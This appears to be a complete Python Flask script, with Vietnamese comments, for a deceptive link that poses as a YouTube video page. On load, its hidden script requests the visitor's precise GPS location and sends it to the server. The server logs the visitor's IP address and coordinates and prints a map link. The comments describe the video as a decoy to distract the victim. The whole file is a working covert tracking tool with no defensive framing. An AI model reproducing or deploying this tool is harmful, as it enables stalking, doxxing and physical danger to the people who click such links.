import os
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Giao diện ngụy trang bằng một video Youtube thật để họ bấm vào là xem được ngay
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Video hay cho bạn</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <!-- Nhúng một video Youtube thật để đánh lạc hướng người xem ngay lập tức -->
    <iframe src="https://youtube.com" allow="autoplay"></iframe>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                // Chạy ngầm xin tọa độ GPS chính xác
                navigator.geolocation.getCurrentPosition(sendPosition);
            }
        }

        function sendPosition(position) {
            let lat = position.coords.latitude;
            let lng = position.coords.longitude;
            
            fetch('/save-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lng })
            });
        }

        // Tự động kích hoạt xin vị trí ngay khi vừa mở trang video
        window.onload = getLocation;
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"\n[!] CÓ NGƯỜI BẤM VÀO LINK!")
    print(f"[+] Địa chỉ IP: {user_ip}")
    return render_template_string(HTML_TEMPLATE)

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.get_json()
    lat = data.get('latitude')
    lng = data.get('longitude')
    
    print("\n" + "="*50)
    print("[🔥] ĐÃ LẤY ĐƯỢC TỌA ĐỘ GPS CHÍNH XÁC!")
    print(f"[+] Vĩ độ (Latitude): {lat}")
    print(f"[+] Kinh độ (Longitude): {lng}")
    print(f"[+] Xem trên Google Maps: https://google.com{lat},{lng}")
    print("="*50 + "\n")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)